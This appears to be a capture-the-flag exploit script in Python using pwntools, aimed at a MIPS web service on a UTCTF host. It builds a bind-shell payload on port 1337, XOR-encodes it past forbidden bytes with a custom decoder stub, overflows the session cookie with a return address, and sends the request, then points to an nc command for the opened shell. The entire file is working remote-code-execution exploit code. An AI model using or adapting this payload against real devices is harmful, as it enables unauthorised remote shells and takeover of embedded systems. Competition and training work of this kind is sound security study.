import requests
import re
from pwn import *


context.update(arch='mips', bits="32", endian='big', os='linux')

exploit = b".1111111111111111111111111111" + b"\x7c\x9f\xfa\x90"
sc = shellcraft.mips.linux
stage1_asm =  sc.bindsh(1337, "ipv4")
stage1_asm += sc.exit()
stage1_raw = asm(stage1_asm)
print(disasm(stage1_raw))

key, data = xor_key(stage1_raw, avoid=b".\r\n\x00abcdefghijklmnopqrstuvwxyz")
decoder = asm(f"""
    li $t6, 0x{key.hex()} # key
    li $t7, {len(data) + 455} 
    addi $t7, $t7, -455   # size
    add $t3, $ra, $t7
    li $t1, 480
    addi $t1, $t1, -420
    add $t3, $t1, $t3
    addi $ra, $ra, -450
loop: 
    addi $ra, 454
    addi $ra, -450
    lw $t2, 510($ra)
    xor $t2, $t2, $t6
    sw $t2, 510($ra)
    addi $t2, $ra, 510
    bne $t2, $t3, loop
""")

print("----------------------")
print(" key: ", key)
print("size: ", len(data))
print(len(decoder))
for i in decoder:
    if i in b".\r\n\x00abcdefghijklmnopqrstuvwxyz":
        print(f"{i}: {chr(i)}, {hex(i)}")

print("----------------------")
stage1 = decoder + data
print(disasm(stage1))

url = "http://puffer.utctf.live:3192/loginFs/passwd"

body = {}

headers = {
  "Referer": url,
  "Cookie": b"S=" + exploit + stage1
}

response = requests.request("GET", url, headers=headers, data=body)

print("----------------------")
print("SHELL: nc puffer.utctf.live:1337")

def tohex(bytes_obj):
    return ''.join(['\\x%02x' % b for b in bytes_obj])
    
def get_bytes(assembly):
    bytecode = bytes()
    for line in assembly.split("\n"):
        instr_hex = re.search(r"\d:\s+([0-9a-f]{8})\s+", line)
        if instr_hex:
            bytecode += bytearray.fromhex(instr_hex.group(1))
    return bytecode
